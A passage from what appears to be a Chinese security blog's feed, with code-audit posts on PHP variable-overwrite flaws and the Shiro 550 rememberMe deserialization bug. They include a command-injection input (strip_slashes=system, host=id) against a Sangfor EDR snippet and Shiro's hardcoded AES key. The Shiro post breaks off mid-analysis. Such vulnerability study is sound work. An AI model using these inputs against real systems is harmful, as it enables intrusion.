alt="image-20200907141129332"></p><h4 id="import-request-variables"><a href="#import-request-variables" class="headerlink" title="import_request_variables()"></a><strong>import_request_variables()</strong></h4><p><strong><code>import_request_variables ( string $types , string $prefix )</code></strong></p><p><a href="https://www.runoob.com/php/php-import\_request\_variables-function.html" target="_blank" rel="noopener">https://www.runoob.com/php/php-import\_request\_variables-function.html</a></p><p><strong>import_request_variables()</strong> 函数将 GET／POST／Cookie 变量导入到全局作用域中。<strong>该函数在最新版本的 PHP 中已经不支持。</strong></p><p><strong>import_request_variables()</strong> 函数将 GET／POST／Cookie 变量导入到全局作用域中。如果你禁止了 register_globals，但又想用到一些全局变量，那么此函数就很有用。</p><p>版本要求：PHP 4 &gt;= 4.1.0, PHP 5 &lt; 5.4.0</p><p><strong>第二个参数$types</strong>：指定需要导入的变量，可以用字母 G、P 和 C 分别表示 GET、POST 和 Cookie，这些字母不区分大小写，所以你可以使用 g 、 p 和 c 的任何组合。POST 包含了通过 POST 方法上传的文件信息。注意这些字母的顺序，当使用 gp 时，POST 变量将使用相同的名字覆盖 GET 变量。任何 GPC 以外的字母都将被忽略。</p><p><img src="https://img-service.csdnimg.cn/img_convert/51a4fd89763e1ae851d2c354e939e346.png" alt="image-20200907104858013"></p><h4 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h4><p>当你在升级PHP到PHP5.4及之后的版本的时候，是否发现register_global配置指令不再生效了呢</p><p>因为从PHP5.4开始register_global配置指令被移除了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"register_globals: "</span> . (int)ini_get(<span class="string">"register_globals"</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"a="</span> . $a;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://img-service.csdnimg.cn/img_convert/79f3b1584af3d084212dc748638eadde.png" alt="image-20200907114032777"></p><h1 id="0x02-深x服edr实例"><a href="#0x02-深x服edr实例" class="headerlink" title="0x02 深x服edr实例"></a>0x02 深x服edr实例</h1><p>简化后的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#var_dump($_REQUEST);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$show_form = <span class="function"><span class="keyword">function</span><span class="params">($params)</span> <span class="title">use</span><span class="params">(&amp;$strip_slashes, &amp;$show_input)</span> </span>&#123;</span><br><span class="line">    extract($params);</span><br><span class="line"></span><br><span class="line">    $host  = <span class="keyword">isset</span>($host)  ? $strip_slashes($host)  : <span class="string">"127.0.0.1"</span>;</span><br><span class="line">    $path  = <span class="keyword">isset</span>($path)  ? $strip_slashes($path)  : <span class="string">""</span>;</span><br><span class="line">    $row   = <span class="keyword">isset</span>($row)   ? $strip_slashes($row)   : <span class="string">""</span>;</span><br><span class="line">    $limit = <span class="keyword">isset</span>($limit) ? $strip_slashes($limit) : <span class="number">1000</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 绘制表单</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;form id="studio" name="studio" method="post" action=""&gt;'</span>;</span><br><span class="line">    $show_input(<span class="keyword">array</span>(<span class="string">"title"</span> =&gt; <span class="string">"Host "</span>,  <span class="string">"name"</span> =&gt; <span class="string">"host"</span>,  <span class="string">"value"</span> =&gt; $host,  <span class="string">"note"</span> =&gt; <span class="string">" - host, e.g. 127.0.0.1"</span>));</span><br><span class="line">    $show_input(<span class="keyword">array</span>(<span class="string">"title"</span> =&gt; <span class="string">"Path "</span>,  <span class="string">"name"</span> =&gt; <span class="string">"path"</span>,  <span class="string">"value"</span> =&gt; $path,  <span class="string">"note"</span> =&gt; <span class="string">" - path regex, e.g. mapreduce"</span>));</span><br><span class="line">    $show_input(<span class="keyword">array</span>(<span class="string">"title"</span> =&gt; <span class="string">"Row  "</span>,  <span class="string">"name"</span> =&gt; <span class="string">"row"</span>,   <span class="string">"value"</span> =&gt; $row,   <span class="string">"note"</span> =&gt; <span class="string">" - row regex, e.g. \s[w|e]\s"</span>));</span><br><span class="line">    $show_input(<span class="keyword">array</span>(<span class="string">"title"</span> =&gt; <span class="string">"Limit"</span>,  <span class="string">"name"</span> =&gt; <span class="string">"limit"</span>, <span class="string">"value"</span> =&gt; $limit, <span class="string">"note"</span> =&gt; <span class="string">" - top n, e.g. 100"</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;input type="submit" id="button"&gt;'</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;/form&gt;'</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">$show_form($_REQUEST);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>变量匿名函数 <code>$show_form</code> 具有一个形式参数 <code>$params</code></p><p>在这里也就是<strong>array(“strip_slashes”=&gt;“system”,“host”=&gt;“id”);</strong></p><p>接下来执行<strong>extract($params);</strong>，后进入如下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$host  = <span class="keyword">isset</span>($host)  ? $strip_slashes($host)  : <span class="string">"127.0.0.1"</span>;</span><br></pre></td></tr></table></figure><p>在这个过程中就产生了漏洞，想要了解具体原因：</p><p>首先函数传入参数值为<code>array(&quot;strip_slashes&quot;=&gt;&quot;system&quot;,&quot;host&quot;=&gt;&quot;id&quot;);</code></p><p>经过<code>extract()</code>函数后，赋值了2个变量：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$strip_slashes &#x3D; &#39;system&#39;;</span><br><span class="line">$host &#x3D; &#39;id&#39;;</span><br></pre></td></tr></table></figure><p>变量<code>$host</code>利用三元运算重新赋值<code>$strip_slashes($host)</code></p><p>而实际上其赋值内容是函数<code>system(&#39;id&#39;)</code>的返回结果，这也就造成了命令执行漏洞。</p><h1 id="0x03MetInfo实例"><a href="#0x03MetInfo实例" class="headerlink" title="0x03MetInfo实例"></a>0x03MetInfo实例</h1><p>/include/common.inc.php</p><p>传入的cookie、get、post参数进行变量赋值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="keyword">array</span>(<span class="string">'_COOKIE'</span>, <span class="string">'_POST'</span>, <span class="string">'_GET'</span>) <span class="keyword">as</span> $_request) &#123;</span><br><span class="line"><span class="keyword">foreach</span>($$_request <span class="keyword">as</span> $_key =&gt; $_value) &#123;</span><br><span class="line">$_key&#123;<span class="number">0</span>&#125; != <span class="string">'_'</span> &amp;&amp; $$_key = daddslashes($_value);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>daddslashes()</code>防注入，不过并不影响</p><p>随便来到一个子文件看看他的加载方式\about\index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># MetInfo Enterprise Content Management System </span></span><br><span class="line"><span class="comment"># Copyright (C) MetInfo Co.,Ltd (http://www.metinfo.cn). All rights reserved. </span></span><br><span class="line">$filpy = basename(dirname(<span class="keyword">__FILE__</span>));</span><br><span class="line">$fmodule=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">'../include/module.php'</span>;</span><br><span class="line"><span class="keyword">require_once</span> $module;</span><br><span class="line"><span class="comment"># This program is an open source system, commercial use, please consciously to purchase commercial license.</span></span><br><span class="line"><span class="comment"># Copyright (C) MetInfo Co., Ltd. (http://www.metinfo.cn). All rights reserved.</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里使用了require_once函数包含了/include/module.php文件，可以发现这个文件又包含了common.inc.php文件</p><p>出现了两个未知变量：<code>$module</code>，<code>$fmodule</code>。我们可以用<code>$fmodule</code>变量通过两次文件包含，使用<code>$_request</code>来获取GET传递的新<code>$fmodule</code>值实现变量覆盖。</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Shiro 550 反序列化漏洞 详细分析+poc编写</title>
      <link href="/2020/09/03/Shiro%20550%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90+poc%E7%BC%96%E5%86%99/"/>
      <url>/2020/09/03/Shiro%20550%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90+poc%E7%BC%96%E5%86%99/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>shiro反序列化漏洞这个从 shiro 550 开始，在2016年就爆出来, 但是到现在在各种攻防演练中也起到了显著作用</p><p>这个漏洞一直都很好用，特别是一些红蓝对抗HW的下边界突破很好用</p><p>遂研究一下这个漏洞的成因和分析一下代码</p><h1 id="0x01-Shiro-550-漏洞描述"><a href="#0x01-Shiro-550-漏洞描述" class="headerlink" title="0x01 Shiro 550 漏洞描述"></a>0x01 Shiro 550 漏洞描述</h1><p>Apache Shiro RememberMe 反序列化导致的命令执行漏洞</p><p>Apache Shiro是一个强大且易用的Java安全框架,执行身份验证、授权、密码和会话管理</p><p>编号：Shiro-550, CVE-2016-4437</p><p>版本：Apache Shiro (由于密钥泄露的问题, 部分高于1.2.4版本的Shiro也会受到影响)</p><h1 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h1><h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><p>编辑器：IDEA 2020</p><p>java版本：jdk1.7.0_80</p><p>Server版本 : Tomcat 8.5.56</p><p>shiro版本：shiro-root-1.2.4</p><p>组件：commons-collections4</p><h2 id="搭建过程"><a href="#搭建过程" class="headerlink" title="搭建过程"></a>搭建过程</h2><p>如果闲配置麻烦，也可以直接用我弄好的GitHub地址</p><p><a href="https://github.com/godzeo/shiro\_1.2.4\_sample.git" target="_blank" rel="noopener">https://github.com/godzeo/shiro\_1.2.4\_sample.git</a></p><h3 id="正常搭建"><a href="#正常搭建" class="headerlink" title="正常搭建"></a>正常搭建</h3><p>直接下载：</p><p><a href="https://codeload.github.com/apache/shiro/zip/shiro-root-1.2.4" target="_blank" rel="noopener">https://codeload.github.com/apache/shiro/zip/shiro-root-1.2.4</a></p><p>下载好以后直接解压</p><p>然后偷偷的进入samples/web目录，直接修改pom文件，主要修改下面这些</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;javax.servlet&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;jstl&lt;/artifactId&gt;</span><br><span class="line">        &lt;!--  这里需要将jstl设置为<span class="number">1.2</span> --&gt;</span><br><span class="line">        &lt;version&gt;1.2&lt;/version&gt;</span><br><span class="line">        &lt;scope&gt;runtime&lt;/scope&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">.....</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;4.0&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;dependencies&gt;</span><br></pre></td></tr></table></figure><p>然后部署，我就直接使用IEDA 部署了</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDMxMTExMzAucG5n?x-oss-process=image/format,png" alt="image-20200903111130024"></p><h2 id="坑点："><a href="#坑点：" class="headerlink" title="坑点："></a>坑点：</h2><p>如果有使用maven打包搭建的话，可能遇到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Failed to execute goal org.apache.maven.plugins:maven-toolchains-plugin:1.1:toolchain (default) on project samples-web: Misconfigured toolchains.</span><br></pre></td></tr></table></figure><p>这应该是maven打包这里要1.6的环境，但运行不影响</p><p>需要修改 maven/conf/toolchains.xml 的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;toolchain&gt;</span><br><span class="line">    &lt;type&gt;jdk&lt;&#x2F;type&gt;</span><br><span class="line">    &lt;provides&gt;</span><br><span class="line">      &lt;version&gt;1.6&lt;&#x2F;version&gt;</span><br><span class="line">      &lt;vendor&gt;sun&lt;&#x2F;vendor&gt;</span><br><span class="line">    &lt;&#x2F;provides&gt;</span><br><span class="line">    &lt;configuration&gt;</span><br><span class="line">      &lt;jdkHome&gt;&#x2F;Library&#x2F;Java&#x2F;JavaVirtualMachines&#x2F;1.6.0.jdk&lt;&#x2F;jdkHome&gt;</span><br><span class="line">    &lt;&#x2F;configuration&gt;</span><br><span class="line">&lt;&#x2F;toolchain&gt;</span><br></pre></td></tr></table></figure><p>我们还需要产生payload的 ysoserial</p><p>ysoserial项目源码在这里<a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial</a> ，然后自己编译， 也可直接下载编译好的release。</p><h1 id="0x03-代码分析"><a href="#0x03-代码分析" class="headerlink" title="0x03 代码分析"></a>0x03 代码分析</h1><p>简单介绍一下漏洞：</p><p>简单介绍利用：</p><ul><li><p>通过在cookie的rememberMe字段中插入恶意payload，</p></li><li><p>触发shiro框架的rememberMe的反序列化功能，导致任意代码执行。</p></li><li><p>shiro 1.2.24中，提供了硬编码的AES密钥：kPH+bIxk5D2deZiIxcaaaA==</p></li><li><p>由于开发人员未修改AES密钥而直接使用Shiro框架，导致了该问题</p></li></ul><h2 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程"></a>加密过程</h2><p>找入口点的话，就是这个漏洞一直提的硬编码地方下手，然后稍微回溯就找到，我们也只需关注rememberMe这个处理就好了</p><p>首先找到/shiro-core-1.2.4.jar!/org/apache/shiro/mgt/AbstractRememberMeManager.class，该类位于shiro-core模块</p><p>我们发现了，我们最常见的，常常提到的的key，那么入口点可能在这里</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">byte</span>[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(<span class="string">"kPH+bIxk5D2deZiIxcaaaA=="</span>);</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIwOTMyMjQucG5n?x-oss-process=image/format,png" alt="image-20200902093224310"></p><ul><li>他是继承了RememberMeManager类，那么我们向上溯源：找到RememberMeManager类的onSuccessfulLogin方法，看名字就直接是登陆成功的处理</li><li>那我们下一个断点，研究一下这个rememberme的加密和处理流程，是个什么原理</li></ul><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIxMDA2MzEucG5n?x-oss-process=image/format,png" alt="image-20200902100631808"></p><p>所以我们登陆一下，debug开启！记得要勾选Remember Me哦</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIxMDEzMjkucG5n?x-oss-process=image/format,png" alt="image-20200902101329183"></p><p>然后我们收到数据了，直接步入跟进</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIxMDE0MTkucG5n?x-oss-process=image/format,png" alt="image-20200902101419301"></p><p>转入了forgetIdentity函数，处理request和response请求，继续跟进this.forgetIdentity方法，进入了</p><p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-EM2oRAEz-1599130237592)(…/Library/Application Support/typora-user-images/image-20200902102404236.png)]</p><p>继续跟进this.forgetIdentity方法，进入了getCookie的removeFrom方法，跟进removeFrom方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.getCookie().removeFrom(request, response);</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIxMDI0MTgucG5n?x-oss-process=image/format,png" alt="image-20200902102418678"></p><ul><li>这里获取看配置信息，最后addCookieHeader放到了返回包中的cookie头中，其中就有我们熟悉的，deleteMe字段和rememberMe字段，也就是我们指纹识别最简单的两种方法的原理</li></ul><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIxMDMyMjMucG5n?x-oss-process=image/format,png" alt="image-20200902103223302"></p><ul><li>然后这一阶段结束了，随后回到刚刚的onSuccessfulLogin方法中，这个isRememberMe主要是检查选择了remember me这个按钮没有，随后步入 rememberIdentity 方法，看看做了什么</li></ul><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIxMDM1MDEucG5n?x-oss-process=image/format,png" alt="image-20200902103501055"></p><p>在rememberIdentity方法中，authcInfo的值就是我们输入root用户名，继续跟进rememberIdentity函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PrincipalCollection principals &#x3D; this.getIdentityToRemember(subject, authcInfo);</span><br><span class="line">this.rememberIdentity(subject, principals);</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIxMDM4MDYucG5n?x-oss-process=image/format,png" alt="image-20200902103806491"></p><p>进入rememberIdentity方法后发现，一个函数就是转化为bytes，跟进convertPrincipalsToBytes</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">rememberIdentity</span><span class="params">(Subject subject, PrincipalCollection accountPrincipals)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">byte</span>[] bytes = <span class="keyword">this</span>.convertPrincipalsToBytes(accountPrincipals);</span><br><span class="line">    <span class="keyword">this</span>.rememberSerializedIdentity(subject, bytes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIxMDQ2MTQucG5n?x-oss-process=image/format,png" alt="image-20200902104614572"></p><ul><li>进入convertPrincipalsToBytes方法，发现它会序列化，而且序列化的是传入的root用户名</li><li>后续跟进看了一下，就是普通的序列化，没有什么特殊的操作，就不继续写了</li><li>然后调用encrypt方法加密序列化后的二进制字节</li><li>这个必须得跟进看一下encrypt方法吧</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">byte</span>[] convertPrincipalsToBytes(PrincipalCollection principals) &#123;</span><br><span class="line">    <span class="keyword">byte</span>[] bytes = <span class="keyword">this</span>.serialize(principals);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.getCipherService() != <span class="keyword">null</span>) &#123;</span><br><span class="line">        bytes = <span class="keyword">this</span>.encrypt(bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bytes;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现CipherService cipherService = this.getCipherService()，就是获取密码服务的意思，那么看一下获取了这么，看一结果发现是AES加密方法，而且是AES/CBC/PKCS5Padding</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">byte</span>[] encrypt(<span class="keyword">byte</span>[] serialized) &#123;</span><br><span class="line">    <span class="keyword">byte</span>[] value = serialized;</span><br><span class="line">    CipherService cipherService = <span class="keyword">this</span>.getCipherService();</span><br><span class="line">    <span class="keyword">if</span> (cipherService != <span class="keyword">null</span>) &#123;</span><br><span class="line">        ByteSource byteSource = cipherService.encrypt(serialized, <span class="keyword">this</span>.getEncryptionCipherKey());</span><br><span class="line">        value = byteSource.getBytes();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIxMDU2MzkucG5n?x-oss-process=image/format,png" alt="image-20200902105639625"></p><p>那么下一句话就是：加密这个传入的数据的方法了。</p><p>再看这就话this.getEncryptionCipherKey()，明显这是获取秘钥了，直接跟进getEncryptionCipherKey</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ByteSource byteSource = cipherService.encrypt(serialized, <span class="keyword">this</span>.getEncryptionCipherKey());</span><br></pre></td></tr></table></figure><p>这个找key 就是在这个类中反复横跳，就可以找到，就详细看了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">this.encryptionCipherKey</span><br><span class="line">setEncryptionCipherKey（）</span><br><span class="line">setCipherKey(byte[] cipherKey)---setEncryptionCipherKey（）</span><br><span class="line">this.setCipherKey(DEFAULT_CIPHER_KEY_BYTES)</span><br></pre></td></tr></table></figure><p>最终溯源到 getEncryptionCipherKey 就是开头中的 DEFAULT_CIPHER_KEY_BYTES，也就是我们一开始第一个提到的kPH+bIxk5D2deZiIxcaaaA==这个key</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIxMTA3NDEucG5n?x-oss-process=image/format,png" alt="image-20200902110741059"></p><p>随后就传入 encrypt函数（root ，刚刚获取的key），这时就加密方法了！！！</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ByteSource <span class="title">encrypt</span><span class="params">(<span class="keyword">byte</span>[] plaintext, <span class="keyword">byte</span>[] key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">byte</span>[] ivBytes = <span class="keyword">null</span>;</span><br><span class="line">  </span><br><span class="line">   <span class="comment">//生成初始化向量，随后 generate:TURE</span></span><br><span class="line">    <span class="keyword">boolean</span> generate = <span class="keyword">this</span>.isGenerateInitializationVectors(<span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (generate) &#123;</span><br><span class="line">       </span><br><span class="line">      <span class="comment">//产生初始化向量</span></span><br><span class="line">        ivBytes = <span class="keyword">this</span>.generateInitializationVector(<span class="keyword">false</span>);</span><br><span class="line">      </span><br><span class="line">      <span class="comment">//异常，不会进入的</span></span><br><span class="line">        <span class="keyword">if</span> (ivBytes == <span class="keyword">null</span> || ivBytes.length == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Initialization vector generation is enabled - generated vectorcannot be null or empty."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//再跟进就是更加具体的方法了，基本的加密逻辑已知 序列化root key 然后还有iv</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.encrypt(plaintext, key, ivBytes, generate);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>加密后数据一直向上回溯，直到 rememberIdentity这个方法下有个 rememberSerializedIdentity方法要跟如，因为这个是记住序列化身份的功能</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIxMTMyMzIucG5n?x-oss-process=image/format,png" alt="image-20200902113232687"></p><p>跟如这个方法，就基本上到了加密的最后一步，把刚刚加密的数据base64，然后都加入到cookie里面</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIxMTM0MjMucG5n?x-oss-process=image/format,png" alt="image-20200902113423550"></p><h2 id="解密过程："><a href="#解密过程：" class="headerlink" title="解密过程："></a>解密过程：</h2><p>现在继续研究解密过程：</p><ul><li>首先确定切入点</li><li>我选择从获取到客户端数据开始分析 ，那就是 org.apache.shiro.mgt.AbstractRememberMeManager 类的 getRememberedPrincipals 方法下断点</li><li>随后在页面随便刷新一下，就可以触发这个方法</li></ul><p>直接跟进 getRememberedSerializedIdentity(subjectContext) 方法，看看从数据中，都获取了什么</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIxNDAxMjAucG5n?x-oss-process=image/format,png" alt="image-20200902140120404"></p><p>这个getRememberedSerializedIdentity方法中 有一个this.getCookie().readValue(request, response)</p><p>这是要读取cookice中的数据了，这必须跟入了</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIxNDA0NDgucG5n?x-oss-process=image/format,png" alt="image-20200902140447964"></p><p>然后 